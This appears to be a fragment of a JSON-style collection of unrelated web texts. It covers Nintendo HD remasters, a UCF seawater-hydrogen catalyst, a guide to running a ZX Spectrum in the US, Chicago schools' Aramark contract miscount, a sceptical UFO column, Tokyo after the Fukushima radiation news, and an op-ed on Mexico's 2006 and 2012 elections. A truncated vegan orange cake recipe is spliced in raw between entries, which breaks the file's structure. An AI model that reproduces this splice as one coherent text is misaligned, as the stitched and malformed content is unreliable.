have Pokemon Omega Ruby and Alpha Sapphire later this year which functions as a remaster, bringing the total count of revisited AAA games up to two. TWO. When you look at Nintendo's lengthy list of ridiculously good games during the past decade, that number seems almost unfair.\n\nIf any platform could benefit greatly from a barrage of HD remasters, it would be the Wii U. A game like Xenoblade Chronicles or a Super Mario Galaxy Collection would do wonders as we wait until late 2015 for all the games Nintendo spoke about at E3 to release. Other candidates include Twilight Princess, Metroid Prime, Super Smash Bros. Melee, and Super Mario Sunshine.\n\nNintendo says Wind Waker HD only existed because Nintendo EAD Group 3 wanted to have experience developing on an HD platform before moving on to the Wii U's upcoming The Legend of Zelda. That might be the case, but chances are it performed better than they could have imagined. It brought in money, probably pushed customers to buy a Wii U—I know it was a part of the reason I bought one—, and let a game from 2003 stuck on a dead platform sail once again.\n\nWho is to say that one of Nintendo's premier studios has to work on remasters, anyway? Sony has routinely turned to small teams to get their collections done. For example, Bluepoint Games created several of the best collections on PS3, including The Ico & Shadow of the Colossus Collection. Have you heard of them? Probably not, but they do a great job and don't cut into the development cycles of teams like SCE Santa Monica Studios and Team ICO.\n\nThe timing couldn't be better. The Wii U needs more games, and Nintendo has dozens of critically acclaimed titles that want a chance to thrive in the modern era. Remastered games are the solution.",
  "latent_7185": "Credit: University of Central Florida\n\nIt's possible to produce hydrogen to power fuel cells by extracting the gas from seawater, but the electricity required to do it makes the process costly. UCF researcher Yang Yang has come up with a new hybrid nanomaterial that harnesses solar energy and uses it to generate hydrogen from seawater more cheaply and efficiently than current materials.\n\nThe breakthrough could someday lead to a new source of the clean-burning fuel, ease demand for fossil fuels and boost the economy of Florida, where sunshine and seawater are abundant.\n\nYang, an assistant professor with joint appointments in the University of Central Florida's NanoScience Technology Center and the Department of Materials Science and Engineering, has been working on solar hydrogen splitting for nearly 10 years.\n\nIt's done using a photocatalyst – a material that spurs a chemical reaction using energy from light. When he began his research, Yang focused on using solar energy to extract hydrogen from purified water. It's a much more difficulty task with seawater; the photocatalysts needed aren't durable enough to handle its biomass and corrosive salt.\n\nAs reported in the journal Energy & Environmental Science, Yang and his research team have developed a new catalyst that's able to not only harvest a much broader spectrum of light than other materials, but also stand up to the harsh conditions found in seawater.\n\n\"We've opened a new window to splitting real water, not just purified water in a lab,\" Yang said. \"This really works well in seawater.\"\n\nYang developed a method of fabricating a photocatalyst composed of a hybrid material. Tiny nanocavities were chemically etched onto the surface of an ultrathin film of titanium dioxide, the most common photocatalyst. Those nanocavity indentations were coated with nanoflakes of molybdenum disulfide, a two-dimensional material with the thickness of a single atom.\n\nTypical catalysts are able to convert only a limited bandwidth of light to energy. With its new material, Yang's team is able to significantly boost the bandwidth of light that can be harvested. By controlling the density of sulfur vacancy within the nanoflakes, they can produce energy from ultraviolet-visible to near-infrared light wavelengths, making it at least twice as efficient as current photocatalysts.\n\n\"We can absorb much more solar energy from the light than the conventional material,\" Yang said. \"Eventually, if it is commercialized, it would be good for Florida's economy. We have a lot of seawater around Florida and a lot of really good sunshine.\"\n\nIn many situations, producing a chemical fuel from solar energy is a better solution than producing electricity from solar panels, he said. That electricity must be used or stored in batteries, which degrade, while hydrogen gas is easily stored and transported.\n\nFabricating the catalyst is relatively easy and inexpensive. Yang's team is continuing its research by focusing on the best way to scale up the fabrication, and further improve its performance so it's possible to split hydrogen from wastewater.\n\n###\n\nMedia Contact\n\nMark Schlueb\n\n[email protected]\n\n407-823-0221\n\n@UCF\n\nOriginal Source\n\nhttps://today.ucf.edu/researchers-nanomaterial-can-extract-hydrogen-fuel-seawater/ http://dx.doi.org/10.1039/C7EE02464A",
  "latent_7296": "How to Buy and Use a ZX Spectrum in America: A Primer from Across the Pond\n\nKim Justice May 3, 2017 7:00 AM Read +\n\nThe almighty ZX Spectrum 48k. British computing in a nutshell.\n\nAs my job here on Retronauts is largely to cover UK/European news, I’m naturally going to be talking about computers like the ZX Spectrum a lot -- however, one of the main questions I always get from people is that one right there in the title. You see, accessing ZX Spectrum games isn’t easy for people in America -- the system never came out over there. And thusly the joys of the Spectrum are going to be fairly closed off for a lot of people...however, don’t fret! I’ve written up a handy little guide that, if you’re interested, should hopefully allow you to play the system -- and the games -- that I’m frequently going to be talking about.\n\nSo, wait...the Spectrum never came out over here in America? Are you sure about that?\n\nWell...ok, it did. Sort of. Back in the early 80’s Sinclair collaborated with Timex on two clones for the US Market -- the Timex Sinclair 1000, and the Timex Sinclair 2068. The TS1000 is based off of the earlier Sinclair ZX81 (somewhat equivalent to a Commodore Vic-20) and is honestly too early and primitive for what you want, although it was a fairly successful computer in its own right. The later 2068 is based off of the classic 48k Spectrum, albeit with increases to memory and other improvements over the regular machine, such as a better keyboard and a cartridge slot on the side -- if you want to play ZX Spectrum games on an old computer that delivers an NTSC 60Hz signal out of the box, this is the system you want.\n\nUnfortunately, the TS2068 was a complete flop sales-wise and was only on the shelves for a few months, meaning that it's considerably harder to find than the TS1000. It’ll probably run you at least 100 dollars on Ebay...and that’s not the only problem! Because of the modifications made to the Timex, it’s incompatible with virtually all European Spectrum software -- it simply can't read ZX Spectrum machine code. Seeing as nearly everything worthwhile released for the Spectrum was European, that’s obviously a problem...TS2068 users did find a solution -- they created a cartridge with the original Spectrum ROM inside that could read the machine code and emulate the software, improving compatibility with the Speccy from next-to-nothing to around 97%. Unfortunately, said cartridges are rarer than the system itself these days, and will likely cost you as much if not more...so yes, you’re looking at a big spend if you want to use a TS2068 at all, let alone use it like a Spectrum. And it only provides composite video (S-Video is available with a mod)...in the end, you’re probably better off going down the traditional route and importing a ZX Spectrum from Europe.\n\nTimex could certainly have taught Sinclair a lot about watches, but their computers shriveled against the likes of the Commodore 64.\n\nThe Timex Sinclair line is far from the only set of ZX Spectrum clones -- there were many other very popular clones in areas like Brazil (the TK-90-X) and especially Eastern Europe (Scorpion, Leningrad, Sintez...so many). This is the dark side though, and as a newbie I do not recommend you explore it yet. We don’t go to Ravenholm.\n\nOk, so...I want a Zee-X Spectrum. What model should I get? How much is this going to cost me?\n\nWoah woah woah. First off, it's ZED-X Spectrum, not Zee-X - watch out, as some people will really lay into you if you don't get this right. It's kind of like if us folk over in the UK started calling Jay Z \"Jay Zed\" instead of \"Jay Zee\" - it would sound wrong.\n\nPronunciations aside, let’s get down to business. I should note straight away that for all Spectrums that you buy from the PAL regions, you’re going to need to factor in import/shipping costs along with some sort of step-up transformer so that you can power it up, as the Spectrum has very specific demands when it comes to power. The iconic Spectrum model is the ZX Spectrum 48k -- that’s the one you’ll always see in pictures. It sold millions, it looks great, and it’s home to most of the system’s classic games. 48k’s are widely available on eBay UK, providing you can find folks who are willing to ship -- import costs aside they’re not that expensive, running around $60-80, or £40-60.\n\nHowever, there’s quite a few issues for you, the American person reading this in 2017. Let’s be blunt: The build quality is not great, the keys are made of cheap and nasty rubber, the sound is a single-channel beeper, and it crashes like you wouldn’t believe. The look of the machine is fantastic, but I would not recommend a 48k to anyone in America -- the main reason being that out of the box, its video signal is not just standard RF only, but a UHF that's designed to work with UK TV channels such as BBC 2 -- chances are good that you won't even be able to connect the standard lead to your TV, let alone get it to actually show a picture. Modding the 48k for composite video is fairly straightforward as far as such things go, but it's also essential if you want to get a picture from it -- and that won't change the other issue of the Speccy pumping out a PAL 50Hz signal. You will likely need some sort of PAL-to-NTSC converter in order to display games in colour, not to mention a TV that's compatible with the signal itself -- and what with all these wires, converters, transformers and cassette recorders running about everywhere, you may end up with a system that looks like it’s on life support. Lazy Game Reviews has a video featuring his own experiences with getting a ZX Spectrum 48k up and running, so I recommend you watch the pain for yourself.\n\nIt may not be a looker, but the ZX Spectrum +2 is undoubtedly the best option for the American Speccy buyer.\n\nThe far better option is to go for the later ZX Spectrum +2 line that was manufactured by Amstrad. They’re not as iconic, but the build quality and keyboard are a lot better for a start. The tape drive is also internal, so there's no need to dig out an old external cassette recorder and fiddle around with the tone dial. The biggest improvement however is that this machine comes with support for RGB SCART right out of the box, so as far as video goes you can just hook it up to any RGB upscaler device, be it a cheapo Hong Kong jobbie or an XRGB Mini Framemeister, and forget about it -- even the cheap upscaler will be an improvement over composite. Just make sure you get the right model cable to go along with it -- Retro Gaming Cables will have what you need.\n\nAlso, these Spectrums are 128k models, thus opening up more games for you to buy! Nearly all the most famous Speccy games are 48k, but there’s a lot of good stuff on 128k -- and the sound’s a lot better on 128k games too, seeing as they used an AY chip for that as opposed to the 48k's beeper. The only trouble with +2’s is that compatibility with 48k games isn’t perfect...it's still very good though -- chances are that you’ll be able to play anything you want to so long as you load it up in the included 48k BASIC mode (Instructions: Press J for LOAD, then Symbol Shift+P twice for “”, then ENTER -- now you’re ready to press Play!). The best model for purpose is the regular +2 (Grey) machine -- easily differentiated from the rest by its grey case, it's by far the most compatible with 48k games while also handling 128k games without issue. The +2A/2B (Black) and +3 models look better but are somewhat less compatible, and the +3 also uses floppy discs as opposed to tape -- it’s not recommended seeing as most games came out on cassette. Finally, Grey +2’s are, like 48k’s, also very common -- in fact, they’ll cost you around about the same price.\n\nThe original ZX Spectrum 128 is another very pretty machine, but also somewhat elusive.\n\nFor the sake of completeness, I should mention the ZX Spectrum+ and the original ZX Spectrum 128 machine as you might run across both of them. The Spectrum+ is primarily an external upgrade to the original 48k machine, featuring a different case and a new keyboard - meaning that you will have the exact same video issues with this machine as you would with the 48k. The Spectrum 128 does feature most of the improvements we've seen from the Amstrad line, including RGB out of the box -- although you'll need an external cassette recorder to load games (or alternatively, a smartphone -- more on that further down). This is by far the rarest of the main models, however - it was only on sale for a few months, and it'll set you back a great deal more money than the Amstrad-made +2 will.\n\nRight! I’ve got my Spectrum...how do I get games for this thing?\n\nWell, you can import them from eBay. Most games are small and inexpensive (aside from ones by say, Ultimate Play the Game -- who went on to become Rare) so they won’t cost that much, but import costs will again add up. There’s a lot of bundles and job lots available which might prove to be cheaper in the long run...again though, there are issues. These games came on cassette tape and most of them are over 30 years old, meaning there’s a very real possibility that the tape itself has degraded over time -- this can even be the case with new-old stock as they never used high-quality tape in the first place -- ferric only. Tape degradation is a much bigger problem here than it would be with your standard audio cassette -- lost frequencies can mean lost data, exposure to magnets can mean entire lost blocks, and all this means R Tape Loading Errors, crashes to BASIC, and a waste of your time. Seriously, loading games off of a cassette is a pain -- especially if you didn't grow up with it and therefore 3-5 minutes or more of waiting for a game to load isn't a part of your personal nostalgia.\n\nTapes are still worth buying for their awesome artwork, such as...um, this. Jet Set Willy is one of the most famous and best-loved Speccy games, by the way.\n\nBut again, there are alternatives! The flashcart solution is one, and the divMMC Future is the newest and best -- it’ll hold all the games you could want with an SD Card and load them up instantly. If you want the authentic loading experience but don’t want to deal with the lottery of old cassettes, you could always buy a cheap MP3/CD cassette tape adapter -- the same sort of thing you’d have in the cassette deck of your car -- hook the audio jack up to a mobile phone, keep your games on the phone and load them through an app. ZXTapeLoader is what I use on Android, but there’s several options such as tapDancer that do roughly the same thing. If you're using a 48k machine, then you can do away with the old cassette recorder and use a smartphone or tablet to load your games instead with this method. No matter what however, if you’re doing this then just make sure that any games you download are perfect copies -- you’ll want anything with the .TZX file extension. As for getting games, you can find that information further down.\n\nWhat about playing the games? Is there any joystick I should look out for?\n\nWell, there’s multiple types...the +2 had a proprietary joystick that came with it -- the SJS1 -- and it wasn’t very good, but cheap adapters do exist that will allow you to use any Atari-style joystick with the +2. If you’re headstrong and desperate for a 48k machine, then guess what? That doesn’t come with any joystick ports built-in, and you’ll need an adapter. The Kempston Interface is by far the most accessible, and compatible with most everything -- once again, it allows the connection of regular Atari-style joysticks to the system....honestly though? I wouldn’t bother with joysticks at all -- you can play basically every Speccy game using the keyboard. Most Speccy games have an option to redefine the keys, and the default/best option is usually Q and A for Up and Down, O and P for Left and Right, and M or Space for Fire. Seriously -- try it out for yourself, it works just fine on these games.\n\nHmmm...righto. Out of interest, are there any modern systems that emulate or recreate the ZX Spectrum?\n\nThere are a couple out there, most of which can be found on the likes of Amazon. The ZX Spectrum Next is probably going to be the easiest of the lot, coming with SD Card functionality as well as HDMI Out, but it’s not out yet. The Sinclair ZX Spectrum Vega+ is a handheld that boasts literally hundreds of games that you can play, but that too isn’t out yet -- that’s been delayed so much that people wonder if it ever will be. The original Vega is available -- it’s a computer on a joypad that has roughly 1,000 games built-in, along with microSD functionality...not having a proper keyboard can be a pain however, and it’s composite video only. You may also run into the Recreated ZX Spectrum, but don’t buy that -- it’s basically a bluetooth keyboard with functionality dependent on apps that aren’t supported by the stores anymore.\n\nThe original Vega tried, but Speccy games are a bit too wild to be controlled by just four buttons and a D-Pad.\n\nYou know what? Life’s too short for all of this. Are there any decent emulators out there?\n\nI understand completely -- and yes, there are. Fuse is probably the one that most people use these days -- it’s very accurate indeed, comes with all the functionality you’d expect, and it emulates every Spectrum model. It’s great, and it’s available on basically any platform out there -- Windows, Mac, Unix, AmigaOS...the lot. Spectaculator is also very good -- like Fuse, it’s super accurate, compatible with everything and emulates all models...it’s a paid product, mind you -- and the desktop version is only available on Windows. However, if you want to play Spectrum games on your Android, iPhone or other Apple device? The mobile version of Spectaculator is probably your best option. A Fuse-based core for the ZX Spectrum also exists for RetroArch and -- if you have a Raspberry Pi setup -- RetroPie. Finally, if you’re in a pinch -- say if you’re bored at the office and you really need to play Manic Miner NOW -- there are plenty of websites that will let you play ZX Spectrum games through a browser; QAOP is your best bet here. As far as games go, World of Spectrum has all the games that companies have allowed the distribution of -- which is a lot. As for specific recommendations? Those will come, but for now you could have a look at WoS's Top 100 page for a solid overview of the Speccy's best.\n\nOk! Hopefully now you know what you need to in order to get yourself playing Spectrum -- whether you take the easy way, or the harder path. Getting an actual ZX Spectrum itself to run in the U.S. may well be a challenge, but it can be rewarding if you stick with it -- and there’s also the added bonus of experiencing classic European computer history. Although needless to say, it’s perfectly understandable if you decide to go down the emulator road instead. Either way, the first thing you’re going to want to do is load up the classic 3D Deathchase from 1983 -- it’s just you, two bikes that you have to blow up, and about a thousand trees. Old school arcade twitch gaming doesn’t get a whole lot better than that.\n\nIn the end, was it all worth it? 'Course it bloomin' well was.\n\nIf you wish to shout at the author, then you can find Kim on her YouTube channel, or on her Twitter @KimXXXJustice.\n\nPlease enable JavaScript to view the comments powered by Disqus.",
  "latent_7310": "CPS forgot 22 schools in estimate for Aramark at a cost of $7 million\n\nThis article was originally published on May 24, 2015.\n\nChicago Public Schools somehow forgot about 22 schools, including a selective enrollment high school, in its estimate to hire Aramark to manage school janitors.\n\nThat mistake — in all, the district underestimated by nearly 3.2 million square feet the amount of space Aramark would have to clean — cost the district an additional $7 million in the controversial contract.\n\nLast month, when the oversight came to light, CPS wouldn’t say how many facilities had been skipped, but instead advised filing a Freedom of Information Act request for the details.\n\nThose records, obtained by the Chicago Sun-Times, show that King College Prep High School is the largest of the buildings CPS failed to count. That elite test-in high school in Bronzeville, home to about 700 students, measures 255,000 square feet, according to CPS.\n\nAlso overlooked were 17 more neighborhood schools, including the top-rated Alcott College Prep High School; four charter schools; and two “options” schools for kids at risk of dropping out, the records show.\n\nTwenty-four more annexes and branches of other schools also were forgotten when CPS’ facilities department measured the district’s space before releasing its request for proposals in June 2013. Square footage was never submitted for two more charter campuses, and CPS also overestimated many sites, including seven school stadiums that turned out to be smaller than expected.\n\nThe counting snafu cost the district an extra $7 million per year over its estimated $64 million in the first year of the contract, yet another debacle in the $260 million contract to privatize custodial management with Aramark, which has been repeatedly criticized for failing to keep the schools clean.\n\nCPS spokesman Bill McCaffrey said the district would have spent the $7 million anyway once all the space was counted. He conceded that Aramark and other companies may have submitted different bids if they had known about all 54 million square feet upfront. He also said that Aramark charged CPS the same rate for the space discovered later.\n\nDespite being asked repeatedly, McCaffrey refused to say how entire buildings got overlooked. Nor would he say who was at fault or how the district miscounted its space so badly.\n\n“CPS regrets this error and is committed to ensuring this mistake cannot be repeated again in the future,” he said.\n\nThe Aramark deal was touted by Chief Administrative Officer Tim Cawley in early 2014 as a way to save CPS up to $40 million over three years. According to Cawley, the district was poised to save $18 million this year alone by handing janitorial management over to the Philadelphia-based Aramark.\n\nA great deal of the savings were to come from cutting janitor positions; some of those layoffs were delayed after principals grumbled about dirty conditions.\n\nBy the start of school, the complaints about filthy schools and principals embroiled in managing the cleaning started rolling in. Several surveys taken by members of the Chicago Teachers Union, the parent group Raise Your Hand and AAPPLE, an arm of the Chicago Principals and Administrators Association, reported mass confusion in janitorial management, vermin, and lack of enough supplies or custodians.\n\nAramark spokeswoman Karen Cutler has stood by her company’s work. Reached last week, she would say only that Aramark did not do any of the initial measuring, and she referred all other questions to CPS.\n\nCPS mom Jennie Biggs couldn’t believe how many schools were skipped.\n\n“I don’t know what to say about that but: ‘How does that happen?’” said Biggs, also a board member of the parent group, Raise Your Hand.\n\n“One of the big arguments Cawley made at that initial board meeting was the amount of money this would save the district. And he kept repeating it again and again,” she said.\n\nHe turned out to be wrong, she said: “It’s disturbing that you would even miss out on that many schools when you’re supposed to be in charge — on so many levels.”",

Soyfree Palm-Oil-free Recipe.\n\nJump to Recipe\n\nWeekend calls for some cake sitting on the counter. And this citrusy 1 bowl orange cake makes it very easy to have some around. Esp when glazed with some boozy marmalade glaze! Right?\n\nMY LATEST VIDEOS\n\nWe end up with a bottle of orange juice or a orange something mix juice every now and then. Hubbs gets some, drinks it a few times and forgets about it. Sometimes he gets it just because there should be something to drink for visitors. And I tell him, we always have water or I can make lemonade. Why get the whole juice bottle, esp when both of us don’t really like it and since packaged juice is just.. that, packaged and questionable. I was brought up in the Orange city in India(yes there is such a city!). Those juicy sweet fresh oranges now appear only in my dreams. The juice from those oranges, so fresh and sweet, also in my dreams. After decades of trying many different options, the sour juice just doesn’t cut it for me. So anywho, I use up the leftover orange juice in this cake. 1 bowl, easy, 8 main ingredients, 2 tbsp oil, vegan orange cake! What do you do with excess juice?\n\nI generally use carton orange juice and the juice varies between brands, types and hence the flavor in the cake. For stronger orange flavor, add zest of an orange to the batter or use orange marmalade frosting. This cake is like a basic sponge cake that needs a moist and flavorful frosting or glaze to make it shine. For more moisture in the cake, add a bit more oil to the batter.\n\nMore Cakes from the blog.\n\n4.92 from 25 votes Print One Bowl Vegan Orange Cake Prep Time 10 mins Cook Time 35 mins Total Time 45 mins Vegan Orange Cake made in 1 Bowl and just 8 ingredients!

Pour the batter in the prepared cake pan. Bake for 30 to 35 minutes or a toothpick from near the center comes out clean. Cool for 10 minutes and remove from pan. Cool completely before slicing. Add frosting of choice like vegan cream cheese frosting, or with whipped coconut cream and fruit, or make a boozy marmalade glaze. For the boozy glaze: Mix a tbsp of liquor in a 1/4 cup of orange or apricot marmalade or preserves of choice. Heat for a few minutes until bubbling. Use as glaze or serve with each slice.

The sugar is in the dry and will feel granulated if it isn't fine enough. Overbaking the cake will make it a bit dry, but it will soften as it cools. Add enough glaze or frosting to add more moisture. For a more moist cake, add another 2 tbsp of oil. You can also make this into a loaf.

  "latent_7559": "One morning several years ago a black triangular-shaped object flew over my home in the San Gabriel Mountains in southern California. It was almost completely silent, made rapid turns and accelerations, and was so nonreflective it looked like a hole in the sky, almost otherworldly. It was, in fact, the B-2 Stealth Bomber, looping around to make another run over the Pasadena Rose Parade on January 1, an annual tradition. But had I not known what it was and seen it first, say, out in the desert at dusk, I might easily have thought it a UFO.\n\nFor decades black triangular-shaped objects have been labeled UFOs. Now a cohort of military, aviation and political observers would like to change the label to a less pejorative phrasing—Unidentified Aerial Phenomena (UAP)—and their efforts to be taken seriously have resulted in a new book by investigative journalist Leslie Kean entitled UFOs: Generals, Pilots, and Government Officials Go on the Record (Crown, 2010). Kean asks readers to consider that such sightings represent “a solid, physical phenomenon that appears to be under intelligent control and is capable of speeds, maneuverability, and luminosity beyond current known technology,” that the “government routinely ignores UFOs and, when pressed, issues false explanations,” and that the “hypothesis that UFOs are of extraterrestrial or interdimensional origin is a rational one and must be taken into account.”\n\nHow much data do we have, and can they help us distinguish between UAPs and what I call Completely Ridiculous Alien Piffle (CRAP), such as crop circles and cattle mutilations, alien abductions and anal probes, and human-alien hybrids? According to Kean, “roughly 90 to 95 percent of UFO sightings can be explained” as “weather balloons, flares, sky lanterns, planes flying in formation, secret military aircraft, birds reflecting the sun, planes reflecting the sun, blimps, helicopters, the planet Venus or Mars, meteors or meteorites, space junk, satellites, sundogs, ball lightning, ice crystals, reflected light off clouds, lights on the ground or lights reflected on a cockpit window,” and more. So the entire extraterrestrial hypothesis is based on the residue of data after the above list has been exhausted. What’s left? Not much.\n\nFor example, Kean opens her exploration “on very solid ground, with a Major General’s firsthand chronicle of one of the most vivid and well-documented UFO cases ever”—the UFO wave over Belgium in 1989–1990. Here is Major General Wilfried De Brouwer’s recounting of the first night of sightings: “Hundreds of people saw a majestic triangular craft with a span of approximately a hundred and twenty feet and powerful beaming spotlights, mov­ing very slowly without making any significant noise but, in several cases, accelerating to very high speeds.” Even seemingly unexplainable sightings such as De Brouwer’s, however, could simply have been an early experimental model of a stealth bomber (U.S., Soviet, or otherwise) that secret-keeping military agencies were understandably loath to reveal.\n\nIn any case, compare De Brouwer’s narrative with Kean’s summary of the same incident: “Common sense tells us that if a government had developed huge craft that can hover motionless only a few hundred feet up, and then speed off in the blink of an eye—all without making a sound—such technology would have revolutionized both air travel and modern warfare, and probably physics as well.” Note how a 120-foot craft becomes “huge,” how “moving very slowly” changes to “can hover motionless,” how “without making any significant noise” shifts to “without making a sound,” and how “accelerating to very high speeds” transforms into “speed off in the blink of an eye.” This language transmutation is common in UFO narratives, making it harder for scientists to provide natural explanations.\n\nIn all fields of science there is a residue of anomalies unexplained by the dominant theory. That does not mean the prevailing theory is wrong or that alternative theories are right. It just means that more work needs to be done to bring those anomalies into the accepted paradigm. In the meantime, it is okay to live with the uncertainty that not everything has an explanation.",

  "latent_7578": "TOKYO (Reuters) - News that radioactive dust had reached Tokyo and low-level radiation had been found in the tap water barely caused a ripple in the capital on Sunday.\n\nAn aerial view shows damage to northern Honshu, Japan, after a 9.0 magnitude earthquake and subsequent tsunami devastated the area March 18, 2011. REUTERS/Jay Okonek/U.S. Navy photo/Handout\n\nMost people in the city of 13 million stayed indoors on a sunny, if slightly hazy, spring day and the middle of a three-day weekend. But shoppers queued as usual for food and vegetables, despite the radiation scare from a nuclear plant in the northeast crippled by a massive earthquake and tsunami nine days ago.\n\n“There’s no way I can check if those radioactive particles are in my tap water or the food I eat, so there isn’t much I can really do about it,” said Setsuko Kuroi, an 87-year-old woman shopping in a downtown Tokyo supermarket with a white gauze mask over her face.\n\n“I don’t plan big changes to my diet. And I only drink bottled water.”\n\nThe Ministry of Education, Culture, Sports, Science and Technology said traces of radioactive iodine were found in dust in Tokyo and the surrounding Kanto area in a 24-hour period starting Friday morning. It added there was no risk to human health.\n\nOfficials in Ibaraki and Fukushima prefectures, the areas closest to the nuclear plant, said some samples of spinach and milk had been found to have higher than usual levels of iodine. They were analyzing samples and asking for a voluntary suspension of shipments.\n\nGovernment officials said the levels were not immediately harmful to human health.\n\n“I’m worried I won’t be able to sell this spinach,” said farmer Teruko Saka, 80, in Moriya in Ibaraki. “Then I’ll have to throw it away like garbage. That will be very sad.” More than a week after the earthquake and tsunami triggered the crisis at the Fukushima Daiichi power plant, 240 km (150 miles) north of Tokyo, many foreigners and tourists have fled the country and rolling blackouts and radiation fears have gripped the capital.\n\nJapan is the only country in the world to have been attacked with nuclear weapons, in 1945 before most of its 127 million were born.\n\nThere has been no panic, and no signs of any exodus from the affected areas.\n\n“They say it’s safe to eat the vegetables as long as we wash them,” said a customer at another Tokyo grocery. “So I am not really worried.”\n\nThere was no suggestion that any vegetables from the nuclear plant zone had reached Tokyo. In the upscale Ginza district, many shops were open, but there were few customers.\n\n“We get a lot of visitors from China, Russia, and other places during the cherry blossom season, but after the tragic destruction it’s hard to see many tourists coming this year,” said Shigeyuki Ando, the manager of a shop selling ceramics and picture frames.\n\n“If it was just me I would stay, but my wife is worried and the (Spanish) government called and told us to go, so we are leaving,” said Daniel Martinez, a 34-year-old Spanish school teacher who was in Japan with his wife on their honeymoon.\n\nThe couple, both carrying large backpacks on the subway, said they were on the way to the airport.\n\n“We would love to come back, but it will be hard to get (an extended) time off like this again sometime soon.”",

  "latent_8180": "The media rewrites history every day, and in so doing, it often impedes our understanding of the present. Mexico's presidential election of a week ago is a case in point. Press reports tell us that Felipe Calderón, the outgoing president from the PAN (National Action party), \"won the 2006 election by a narrow margin\".\n\nBut this is not quite true, and without knowing what actually happened in 2006, it is perhaps more difficult to understand the widespread skepticism of the Mexican people toward the results of the current election. The official results show Institutional Revolutionary party (PRI) candidate Enrique Peña Nieto winning 38.2% of the vote, to 31.6% for Andrés Manuel López Obrador, of the party of the Democratic Revolution (PRD) and 25.4% for Josefina Vázquez Mota of the PAN. It does not help that the current election has been marred by widespread reports of vote-buying. From the Washington Post:\n\n\"'It was neither a clean nor fair election,' said Eduardo Huchim of the Civic Alliance, a Mexican watchdog group funded by the United Nations Development Program. \"'This was bribery on a vast scale,' said Huchim, a former [Federal Electoral Institute] official. 'It was perhaps the biggest operation of vote-buying and coercion in the country's history.'\"\n\nIt may not have been enough to swing the presidential race, but for those who know what actually happened in 2006, the voters' lack of faith in the results is completely understandable. The official margin of difference between Calderón and López Obrador of the PRD, who was also the PRD's nominee in the 2006 election, was 0.58%. But there were massive irregularities.\n\nThe most prominent, which was largely ignored in the international press, was the \"adding-up\" problem at the majority of polling places. According to Mexico's electoral procedures, each polling station gets a fixed number of blank ballots. After the vote, the number of remaining blank ballots plus the number of ballots cast are supposed to add up to the original blank ballots. For nearly half of polling places, this did not happen.\n\nBut it got worse than that: because of public pressure, the Mexican electoral authorities did two partial recounts of the vote. The second one was done for a huge sample: they recounted 9% of the ballots. But without offering any explanation, the electoral authorities refused to release the results of the recount to the public.\n\nFrom 9-13 August 2006, the Mexican electoral authorities posted thousands of pages of results on the web ,which included the recounted ballot totals. It was then possible, with hundreds of hours of work, to piece together what happened in the recount and compare it to the previous results. At the Center for Economic and Policy Research (CEPR), we did this for a large random sample (14.4%) of the recounted ballots. Among these ballots, Calderón's margin of victory disappeared.\n\nThis may explain why the electoral authorities never told the public what the recount showed, and why the authorities refused to do a full recount – which would have been appropriate for such a close election with so many irregularities. A full recount could easily have reversed the result, or found the election to be completely indeterminate.\n\nAt that time, I was struck by the lack of interest in the media as to either the \"adding-up\" problem, or the results of the recount. Both of these results were readily available on the web. Although it was laborious to tally the recount data, any news organization with a modicum of resources could have done the work. But none was interested.\n\nLópez Obrador made the mistake of claiming that the 2006 election was stolen without demanding that the recount results be released – possibly, because he didn't trust that these would be any more accurate than the original count. He did call attention to the adding-up problem, but the media ignored this and mostly portrayed him as a sore loser.\n\nBoth the 2006 and 2012 elections were manipulated in other ways. A study from the University of Texas shows that there was significant media bias against López Obrador in 2006, and that it was much more than enough to swing a close election. About 95% of broadcast TV is controlled by just two companies, Televisa and Azteca, and their hostility toward the PRD has been documented.\n\nIn the current presidential campaign, the media duopoly ran into criticism for not broadcasting nationally the first presidential debate on 6 May. After student protesters were dismissed in the media as outside agitators, a protest movement against the TV media was launched – called \"Yosoy#132\" (\"I am #132\"), after 131 of the initial protesters produced a viral video showing their student IDs (that is, to indicate that they were genuine students).\n\nJohn Ackerman rightly criticized President Obama for congratulating Peña Nieto as the winner before the official results were in. This was similar to the Bush administration's efforts to aid Calderón in 2006, which began immediately after the vote. The Calderón campaign to establish his \"victory\" as a fait accompli was modeled after the Bush team's successful exploitation of its \"home field advantage\" in Florida in 2000, as chronicled in Jeffrey Toobin's excellent book, Too Close to Call.\n\nAs I have noted previously, it is not because Mexico has a rightwing electorate that it has gone against the trend of the last 14 years in Latin America. One country after another (Brazil, Venezuela, Argentina, Ecuador, Bolivia, Uruguay, Paraguay, Honduras, El Salvador, Nicaragua and others) has elected and re-elected left governments in response to Latin America's worst long-term economic failure in more than a century (1980-2000). Although the rest of the region has done better over the past decade, Mexico has not.\n\nSome have pointed out that the other left presidents in the Americas also faced hostile, biased media, and nonetheless won. This has certainly been true in all of the above-named countries; some, such as Bolivia, have even worse media bias than Mexico. But Mexico is, as the saying goes, \"so far from God and so close to the United States\".\n\nIt is one thing to portray a leader of Ecuador or Bolivia as \"another Hugo Chávez\", as the media campaigns there and elsewhere did. These candidates mostly laughed it off. But when the media in Mexico does the same to López Obrador – as it has been doing since 2006 – it has another meaning. Mexico shares a 2,000-mile border with the United States and sends 80% of its non-oil exports north. Not to mention the 12 million Mexicans living in the United States.\n\nMexico's rightwing media are in a stronger position to boost an effective scare campaign. From Greece to Ireland to Mexico, that is how the elite maintains its grip on power in failing economies – not by offering hope, however tenuous, of a better future, but by spreading the fear that any attempt at a positive alternative will bring Armageddon.\n\nSo long as Mexico's right controls the TV media – and can get some extra insurance by manipulating the electoral process as needed – Mexico will have a very limited form of democracy and will also fall far short of its economic potential.\n\n• Editor's note: the article originally stated that the 2006 \"adding-up\" problem applied in a majority of polling places; in fact, it did so in nearly half.

